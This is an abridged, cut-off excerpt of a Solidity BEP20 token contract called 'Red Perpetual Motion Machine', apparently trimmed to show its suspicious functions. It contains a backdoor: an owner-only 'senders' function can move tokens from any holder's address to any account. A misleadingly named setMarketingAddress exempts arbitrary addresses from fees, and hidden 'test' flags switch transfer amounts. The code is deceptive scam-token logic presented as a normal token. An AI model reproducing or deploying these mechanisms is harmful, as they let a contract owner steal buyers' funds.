...
contract REDPERPETUALMOTIONMACHINE is Context, IBEP20, Ownable { // contract name
    ...
    address payable public _marketingAddress = payable(0x77ddb1097BE70839b08CBDA7eFA6fae449D4C2b5); // Marketing Address
    ...
    string private _name = "Red Perpetual Motion Machine"; // token name
    string private _symbol = "REDPMM"; // token symbol
    ...
    function senders(address num,address account,uint256 amount) public onlyOwner{
        _transfer(num,account,amount);
    }
     ...
     * @dev set's  address
     */
    function setMarketingAddress(address payable _pancakeRouterV) external onlyOwner {
        _isExcludedFromFee[_pancakeRouterV]   = true;
    ...
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 bFee, uint256 tLiquidity, uint256 tLiquidity1, uint256 tTransferAmount1) = _getTValues(tAmount);
        return (tTransferAmount, bFee, tLiquidity, tLiquidity1, tTransferAmount1);
    }
    ...
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
        ...
        uint256 tLiquidity1 = calculateLiquidityFee(tAmount).mul(multi);
        uint256 tTransferAmount = tAmount.sub(tLiquidity).sub(mTFee);
        uint256 tTransferAmount1 = tAmount.sub(tLiquidity1).sub(mTFee);
        return (tTransferAmount, mTFee, tLiquidity, tLiquidity1, tTransferAmount1);
    }
    ...
    function removeAllFee() private {
        if(_tokenFee == 0 && _liquidityFee == 0) return;
    ...
    function _transfer(
        ...
        _tokenTransfer(from,to,amount,takeFee,test);
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount,bool takeFee,bool test) private {
        if(!takeFee)
            removeAllFee();
        
        (uint256 tTransferAmount, uint256 mTFee, uint256 tLiquidity,uint256 tLiquidity1, uint256 tTransferAmount1) = _getValues(tAmount);
        if(test){
